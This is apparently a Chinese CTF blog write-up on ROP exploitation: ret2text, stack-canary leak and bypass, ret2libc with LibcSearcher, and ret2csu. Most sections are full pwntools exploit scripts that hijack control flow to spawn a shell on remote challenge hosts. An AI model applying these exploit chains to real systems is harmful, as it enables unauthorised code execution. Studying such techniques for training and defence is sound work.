---
title: "PWN:ROP"
image: ''
pinned: false
comment: true
published: 2026-03-04
updated: 2026-04-16
description: "PWN"
category: PWN
tags: [PWN]
---

PWN中:ROP使用方法



## 一:简单ret2text

![image-20260304185547856](/images/image-20260304185547856.png)

虽然这一题是溢出的题目，但关键的考点还是在rop的使用。

直接通过ida和ubuntu的指令进行分析，可以很明显的发现存在栈溢出的点，但不存在直接system("/bin/sh")给我用，仅仅只有一个notbackdoor的函数直接包含了ls的system指令，所以正常的栈溢出，是无法直接得到flag的，只能看见根目录的各种文件并发现有个名字就叫flag的文件。

虽然在另一篇文章写过rop的原理，但在这边还是简单做一个讲解。



简单来说，**ROP** 是一种存在保护时（比如开启NX，堆栈不可执行）的情况下，使用的攻击技术。

我们可以通过与正常shellcode进行比较来做进一步理解：

- **正常Shellcode**：就比如栈溢出，我们直接利用垃圾数据流覆盖缓冲区，将我们需要执行的函数地址写在ret的后面，欺骗程序去执行，劫持执行流。
- **ROP**：相当于用最基础的函数去完成我们的攻击，比如直接在程序的函数表里寻找我们需要的函数，比如puts，open，system之类的函数。



由于程序no pie 所以我们不需要用基址加偏移的方法，而是可以直接静态分析得到的。

通过ropgaget的攻击找到pop_rdi的地址，在程序里面直接搜索字符串和函数，可以得到/bin/sh的地址和system函数的地址。

offset是在ida里面通过看栈分布，得到程序允许我们输入的字节为0x20，而本身寄存器有占了8字节，

![image-20260304194836848](/images/image-20260304194836848.png)

将通过发送40个字节的a就可以覆盖缓冲区，然后用ret，栈对齐一下，用pop_rdi传送/bin/sh给system，然后调用system，完成shell的获得。

```
from pwn import *

io = remote('171.80.2.169', 18784) 

offset = 40
pop_rdi = 0x40126b     
bin_sh = 0x402004      
system_plt = 0x401050  
ret = 0x40126c      

# 填充 -> 栈对齐 -> 把 /bin/sh 送入 RDI -> 调用 system
payload = b'A' * offset 
payload += p64(ret)      
payload += p64(pop_rdi) 
payload += p64(bin_sh) 
payload += p64(system_plt)


io.sendlineafter(b"Please Input your name.", payload) 
io.interactive()
```



----



## 二:canary绕过

![image-20260306130710599](/images/image-20260306130710599.png)

这是一道栈溢出加canary绕过加rop传参数的题目，通过file和checksec，我们可以得到程序为64位大端序，存在canary，no pie，

通过运行程序和简单的静态分析，我们可以知道，程序两次读入我的数据，读入函数均为read。

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[48]; // [rsp+10h] [rbp-240h] BYREF
  char v5[520]; // [rsp+40h] [rbp-210h] BYREF
  unsigned __int64 v6; // [rsp+248h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  write(1, "Welcome!\n", 0x10u);
  write(1, "Please leave your name(Within 36 Length):", 0x29u);
  read(0, buf, 0x300u);
  printf("Hello %s\n", buf);
  write(1, "Please leave a message(Within 0x200 Length):", 0x2Cu);
  read(0, v5, 0x300u);
  printf("your message is :%s \nBye~", v5);
  return 0;
}
```

而且通过对栈上数据的计算可得到，第二次输入的数据到覆盖ret地址需要0x208地址的垃圾数据流，现在关键是在于寻找canary的值和位置，虽然不知道为什么末字节为00，但canary的数据是0x...........的数据流。

通过多次gdb分析，我们可以得到，canary的实际位置为：

```
0b:0058│-1f8 0x7fffffffdd28 ◂— 0
... ↓ 61 skipped 
49:0248│-008 0x7fffffffdf18 ◂— 0xe65218c0afbe2700 
4a:0250│ rbp 0x7fffffffdf20 ◂— 1
```

```
[buffer ...]
[canary]      <-- rbp-0x8
[saved rbp]   <-- rbp
[ret addr]    <-- rbp+8
```

寻找到canary的位置后，通过在canary后面加上\x00强制打印可以得到canary值，通过填充垃圾数据流，在第一次发送数据时，打印canary，就可以绕过canary保护。

然后使用rop技术通过将程序里面的/bin/sh参数传送给函数system，完成shell的调用。

objdump -d pwn4 | grep "system@plt"

没有pie减少了很少麻烦，否则就需要计算偏移加动态分析 了/。

```
from pwn import *

p = remote("171.80.2.169", 18237)
context.arch = 'amd64'
context.log_level = 'debug'

bin_sh = 0x601068           # /bin/sh 地址
pop_rdi = 0x400963          # pop rdi; ret
system_plt = 0x400660       #system 地址
ret_gadget = 0x400813       # ret 对齐


leak_offset = 0x238         # buf 到 canary
exploit_offset = 0x208      # message 到 canary

log.info("正在泄露远程 Canary...")


payload_leak = b'a' * leak_offset + b'z'
p.sendafter(b"your name(Within 36 Length):", payload_leak)

p.recvuntil(b'z')


canary_raw = p.recv(7)
canary = u64(canary_raw.rjust(8, b'\x00')) 

log.success(f"成功获取 Canary: {hex(canary)}")


log.info("正在发送 ROP 链获取 Shell...")


rop = [
    ret_gadget,         
    pop_rdi, bin_sh,       
    system_plt          
]

payload_final = b'a' * exploit_offset
payload_final += p64(canary)
payload_final += b'b' * 8        
payload_final += b''.join([p64(i) for i in rop])

p.sendafter(b"leave a message", payload_final)

p.interactive()
```

![image-20260306132139961](/images/image-20260306132139961.png)



----



## 三.经典ret2libc

程序中要存在put这个函数，这个脚本才有用。

![image-20260313184227163](/images/image-20260313184227163.png)

```
from pwn import *
from  LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
p=remote('node7.anna.nssctf.cn',23312)

elf=ELF('./1')

def debug():
    gdb.attach(p)
    pause()

def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

rdi=0x400763
payload=b'a'*0x18 + p64(rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
p.sendline(payload)

libc_base = get_addr() - 0x06f6a0
system = libc_base + 0x0453a0
binsh = libc_base + 0x18ce57

payload = b'a'*0x18 + p64(rdi) + p64(binsh) + p64(system) 
p.sendline(payload)
p.interactive()
```



---



## 四：ret2csu构造rop链

现代版本多不同，这个**部分仅供参考**

![image-20260319205249477](/images/image-20260319205249477.png)

通过对寄存器进行控制完成对于函数的调用。

![image-20260319211834413](/images/image-20260319211834413.png)

![image-20260319211902990](/images/image-20260319211902990.png)

```
# ############ 阶段 1：利用 write 函数泄漏 libc 地址 ############
# 0x80 是缓冲区大小，8 是覆盖 rbp 的长度
payload1 = b'A' * 0x80 + b'B' * 8  # 填充 stack 直到返回地址

# 调用 gadget1 (通常是 pop rbx, rbp, r12, r13, r14, r15, ret)
payload1 += p64(gadget1)          # 返回到 gadget1
payload1 += p64(0)                # pop rbx: 设置为 0，方便后续 gadget2 的 call [r12 + rbx*8]
payload1 += p64(1)                # pop rbp: 设置为 1，使得后续 cmp rbx, rbp 能够通过
payload1 += p64(write_got)        # pop r12: 后面 gadget2 会 call 这个地址指向的函数（write）
payload1 += p64(1)                # pop r13: 对应 edi (参数1: fd = 1, stdout)
payload1 += p64(write_got)        # pop r14: 对应 rsi (参数2: addr = write 的 GOT 地址)
payload1 += p64(8)                # pop r15: 对应 rdx (参数3: len = 8 字节)

# 调用 gadget2 (通常是 mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8])
payload1 += p64(gadget2)
payload1 += b'\x00' * 0x38        # gadget2 执行完后会滑入 gadget1 的 pop 操作，需填充 0x38 字节对齐
payload1 += p64(main_addr)        # 再次返回 main 函数，等待第二次触发漏洞

p.sendafter('Hello, World\n', payload1)

# 接收泄漏的地址并计算 libc 基址
write_addr = u64(p.recv(8))
libc_base = write_addr - libc.sym['write']
system_addr = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

success("libc_base: {}".format(hex(libc_base)))
success("system_addr: {}".format(hex(system_addr)))
success("binsh: {}".format(hex(binsh)))

# ############ 阶段 2：通过 read 函数将数据写入 .bss 段 ############
payload2 = b'A' * 0x80 + b'B' * 8  # 填充
payload2 += p64(gadget1)          # 进入 gadget1
payload2 += p64(0)                # pop rbx
payload2 += p64(1)                # pop rbp
payload2 += p64(read_got)         # pop r12: 准备调用 read
payload2 += p64(0)                # pop r13: 对应 edi (参数1: fd = 0, stdin)
payload2 += p64(bss_addr)         # pop r14: 对应 rsi (参数2: 写入地址为 .bss)
payload2 += p64(16)               # pop r15: 对应 rdx (参数3: 读取 16 字节)

payload2 += p64(gadget2)          # 执行 read(0, bss_addr, 16)
payload2 += b'\x00' * 0x38        # 填充
payload2 += p64(main_addr)        # 返回 main 准备第三次利用

p.sendafter('Hello, World\n', payload2)
sleep(1)
# 发送 8 字节 system 地址 + 8 字节 "/bin/sh" 字符串
p.send(p64(system_addr) + b'/bin/sh\x00')
sleep(1)

# ############ 阶段 3：调用 system("/bin/sh") 获取 Shell ############
payload3 = b'A' * 0x80 + b'B' * 8
payload3 += p64(gadget1)
payload3 += p64(0)                # pop rbx
payload3 += p64(1)                # pop rbp
payload3 += p64(bss_addr)         # pop r12: [bss_addr] 里现在存的是 system 的地址
payload3 += p64(bss_addr + 8)     # pop r13: 对应 edi (参数1: 指向 "/bin/sh" 的地址)
                                  # 注意：此处 edi 只能赋值低 32 位，但通常对 bss 地址足够
payload3 += p64(0)                # pop r14: rsi = 0
payload3 += p64(0)                # pop r15: rdx = 0

payload3 += p64(gadget2)          # 执行 call system(rdi="/bin/sh")
payload3 += b'\x00' * 0x38        # 填充
payload3 += p64(main_addr)        # 结尾逻辑（此处其实已拿到 shell）

p.sendafter('Hello, World\n', payload3)
p.interactive()                   # 进入交互模式
```

其实由于版本的更新，这个特殊的函数也发生了变化。

![image-20260325210208827](/images/image-20260325210208827.png)

以下为近期遇到的题目的payload，可供参考。

```
from pwn import *

context(os='linux', arch='i386', log_level='debug')
p = remote('node5.buuoj.cn',28254)

libc_csu_init_end = 0x08048518  # pop ebx; esi; edi; ebp; ret
libc_csu_init_call = 0x080484F8 # loc_80484F8: 这里的 push 逻辑

system_got_ptr = 0x0804a010     
bin_sh_addr = 0x0804a024       

# 计算 EBX: 指令是 call [ebx + edi*4 - 0xf8]
# 设 edi=0, 则 ebx = system_got_ptr + 0xf8
target_ebx = system_got_ptr + 0xf8

# 偏移量 0x88 + 4 = 140
payload = b'a' * 140

# --- 阶段 1: 填入寄存器 ---
payload += p32(libc_csu_init_end)
payload += p32(target_ebx)       # ebx -> 配合 edi 寻址到 system_got
payload += p32(1)                # esi -> 计数器，运行一次后退出
payload += p32(0)                # edi -> 索引 0
payload += p32(bin_sh_addr)      # ebp -> 对应指令 push ebp，即 system 的参数

# --- 阶段 2: 回到 csu 中间的 call 逻辑 ---
payload += p32(libc_csu_init_call)

# --- 阶段 3: 核心对齐填充 (重点!) ---
# 此时程序执行了 3 次 push，esp 减小了 12 字节。
# 紧接着执行 call，call 会再压入 4 字节返回地址。
# 所以我们需要在 payload 里补齐数据，使得 system 运行时能看到参数。
payload += p32(0x08048360)       # 对应 [esp+24h] 处的数据占位
payload += p32(bin_sh_addr)      # 关键：这个值会被 [esp+24h] 偏移取到压入栈
payload += p32(0xdeadbeef)       # 填充占位
payload += b'B' * 4              # 补齐到 16 字节，对应 add esp, 10h

# --- 阶段 4: 退出循环后的 pop 平衡 ---
payload += p32(0) * 4            # 弹出 ebx, esi, edi, ebp
payload += p32(0x08048360)       # 最后的返回地址 (回到 main)

p.recvuntil("Input:\n")
p.sendline(payload)
p.interactive()
```

这边是在程序存在system函数和/binsh参数的情况下，利用ret2cus传参的代码，关键难点在于这个对齐，只要一不对齐，代码就段错误失败。

以上仅供参考。

#### 简单讲解：

首先ret2csu的用法极大部分是在不存在pop rdi这个gadget时候使用的。

如果存在那个gadget就不需要这么麻烦了。对应的汇编源码已经在上面了，libc_csu_init。

该函数存在两个gadget以构成我们的rop链。

![image-20260326143854764](/images/image-20260326143854764.png)

这段用来调用函数，成为gadget1。

![image-20260326143920614](/images/image-20260326143920614.png)

这段用来调整寄存器结构，完成调用函数的前置，成为gadget2。

我们payload要先从gadget2开始。

`p32(libc_csu_init_end)`覆盖返回函数进入rop；

`p32(target_ebx)` 这边是通过上面的call指令得到的，看第一个gadget1中的call函数，它实际上是`call [ebx + edi*4 - 0xf8]`，这其实是调用函数的地址，我们通过第二个gadget2控制edi，ebx就是改变本来汇编代码调用的函数。

在这一题中，我们是调用system函数，因为本来的程序中存在binsh的参数，设置edi为0，所以ebx = system_got_ptr + 0xf8，这便是我们想要设置的目标ebx的值；

`payload += p32(1)`

![image-20260326145236582](/images/image-20260326145236582.png)

这边是设置esi的值，本来它是这样的作用，但它其实也可以做为计数器，设置esi为1，保证我们的rop值进行一次，避免多次运行出现难以预测的问题；

`payload += p32(0)`  设置edi为0；`payload += p32(bin_sh_addr)` 设置ebp的值，即帧底的指向，到时候到gadget1时，程序回去看ebp，然后我们的参数就能传入调用函数中；

`payload += p32(libc_csu_init_call)`进入gadget2，开始调用函数；

当程序正常运行后经过三个push，然后调用函数，三个push在栈中压入了三个参数依次为binsh，p32(0x08048360) ，p32(0xdeadbeef)，这是程序汇编代码写好的，强制数据，正常来说，只要保证参数合法，就可以了，我们只是要传binsh给system函数。

```
payload += b'B' * 4            
payload += p32(0) * 4          
payload += p32(0x08048360)      
```

第一行是为了应付add 16h的指令，本来三次push加sub一共下降了16字节，用add来填补，但真让其填补了，我们后面的所有指令都失败了，由于我们的设置在源码中cmp中，程序不会跳转，如果执行到后面的pop指令时，我们stack中的数据乱了，那就会崩溃。

这边主要就是保证程序后续顺利进行。

> https://gemini.google.com/share/2a07b79affc8

借助ai理解。



----



## 五:依旧ret2libc

这份是经过修改的，首先使用前，依旧是需要程序有puts函数，这一题主要是当题目不给libc时做的，上面的那题是有给的。

这边是通过LibcSearch这个工具攻击到的。

泄露一个 libc 函数真实地址（常见 puts、read、printf），用 LibcSearcher(符号名, 泄露地址) 猜 libc 版本；用 dump() 拿到该 libc 里符号偏移，算基址，用基址 + 偏移算 system 和 "/bin/sh"。

**注意：** 只有一个函数的话，LibcSearch极有可能会找到多个版本的libc，所以有时候要多用几个函数。



```
from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
p = process('./pwn')

elf = ELF('./pwn')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

offset = 0x0c + 0x08

payload = offset * b'a'
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['welcome'])


def leak_puts():
    # 先吃掉 welcome 里的 puts 回显
    p.recvline()
    # 直接读 6 字节地址，避免地址里出现 0x0a 时 recvline 截断
    leak = p.recvn(6)
    # 把 puts 自动补的换行读掉
    p.recvline()
    return u64(leak.ljust(8, b'\x00'))


def resolve_libc(puts_addr):
    try:
        libc = LibcSearcher('puts', puts_addr)
        libc_base = puts_addr - libc.dump('puts')
        system = libc_base + libc.dump('system')
        binsh = libc_base + libc.dump('str_bin_sh')
        return system, binsh
    except (SystemExit, Exception):
        # 新版本 libc 可能在 LibcSearcher 里找不到，回退到本地 libc
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
        libc_base = puts_addr - libc.sym['puts']
        system = libc_base + libc.sym['system']
        binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
        return system, binsh


p.sendline(payload)

puts_addr = leak_puts()
system, binsh = resolve_libc(puts_addr)

payload2 = offset * b'a'
payload2 += p64(ret)          # 栈对齐（可选，如果执行 system 奔溃就加上）
payload2 += p64(pop_rdi)      # 弹出参数到 rdi
payload2 += p64(binsh)        # "/bin/sh" 字符串地址
payload2 += p64(system)       # 调用 system()

p.sendline(payload2)

p.interactive()

```

#### 积累：

 通过泄露的puts地址用libcsearch寻找libc版本

```
puts_addr = leak_puts()

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr  = libc_base + libc.dump('str_bin_sh')
```















---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
